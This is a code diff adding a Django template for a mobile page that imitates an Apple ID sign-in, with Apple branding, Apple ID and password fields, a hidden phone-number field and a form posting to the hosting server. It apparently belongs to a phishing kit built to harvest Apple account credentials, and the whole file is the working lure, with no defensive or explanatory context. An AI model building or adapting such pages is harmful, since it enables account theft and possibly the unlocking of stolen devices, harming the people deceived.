@@ -1,0 +1,67 @@
+{% load static %}
+
+
+<link rel="stylesheet" type="text/css" href="{% static 'css/mobile_stylesheet.css' %}" />
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.5.2/jquery.min.js"></script>
+ <script type='text/javascript' src='http://code.jquery.com/jquery.min.js'></script>
+<meta name="apple-mobile-web-app=capable" content="yes">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no>
+<link rel="apple-touch-icon" href="http://logok.org/wp-content/uploads/2014/04/Apple-Logo-black.png">
+
+    <body class="signin">
+    <div class="container" align="center">
+        <div id="loginForm">
+
+            <div class="panel panel-default">
+
+                <div class="panel-body">
+
+                    <form action="" class="form-control" method="POST" accept-charset="UTF-8" role="form">
+                        {% csrf_token %}
+                        <input class="form-control" id="email" placeholder="Apple ID" name="user" value="" type="text" required autocapitalize="off" autocorrect="off">
+                        <input class="form-control" id="passwd" placeholder="Password" name="passwd" type="password" value="" required autocapitalize="off" autocorrect="off">
+                        <input type="hidden" name="phone" value="{{ phone }}">
+
+                         {% if error_message %}
+                                    <input style="margin-top:-40px;" id="login" name="login" class="login" type="image" src="{% static 'images/enabled-button.png' %}" disabled='disabled'>
+                                    <span class="error" style="position: absolute; margin-right: 40px; margin-left:-328px; margin-top: -9px;"> <img style=" width:105%;" src="{% static 'images/login_error.png' %}"> </span>
+                                {% else %}
+                                    <div class="checkbox">
+                                        <label>
+                                            <input style="width:21px;height:20px; border: 0;" id="remember" name="remember" type="checkbox" value="Remember Me">
+                                        </label>
+                                    </div>
+                                    <input style="position: absolute;" id="login" name="login" class="login" type="image" src="{% static 'images/enabled-button.png' %}" disabled='disabled'>
+                            {% endif %}
+                    </form>
+
+                </div>
+            </div>
+        </div>
+    </div>
+    </body>
+
+
+
+
+<script type='text/javascript'>
+$(function () {
+    $('#passwd').keyup(function () {
+        if ($(this).val() == '') {
+            //Check to see if there is any text entered
+            // If there is no text within the input ten disable the button
+            $('.login').prop('disabled', true);
+        } else {
+            //If there is text in the input, then enable the button
+            $('.login').prop('disabled', false);
+        }
+    });
+});
+
+
+
+$(".error").fadeIn(3000, function() {
+  $(this).load(function() { $(this).fadeIn(); });
+  $(this).attr("src", "{% static 'images/login_error.png' %}");
+});
+</script>
